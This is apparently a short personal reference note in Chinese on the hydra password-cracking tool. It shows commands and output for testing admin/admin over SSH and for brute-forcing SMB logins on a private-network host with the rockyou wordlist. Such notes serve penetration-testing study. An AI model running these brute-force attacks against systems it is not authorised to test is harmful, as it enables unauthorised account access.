# hydra

## example
以帳密admin/admin測試host 172.17.29.124的ssh連線
```console
# hydra -l admin -p admin ssh://172.17.29.124
[DATA] attacking service ssh on port 22
[22][ssh] host: 172.17.29.124   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
```
以帳號admin，並使用密碼資料檔/usr/share/wordlists/rockyou.txt，對host 172.17.29.124的SMB進行測試
```console
# hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 smb://172.17.29.124
[DATA] attacking service smb on port 445
[STATUS] 5830.00 tries/min, 5830 tries in 00:01h, 14338569 to do in 40:60h, 1 active
[STATUS] 5884.00 tries/min, 17652 tries in 00:03h, 14326747 to do in 40:35h, 1 active
[445][smb] host: 172.17.29.124   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
```
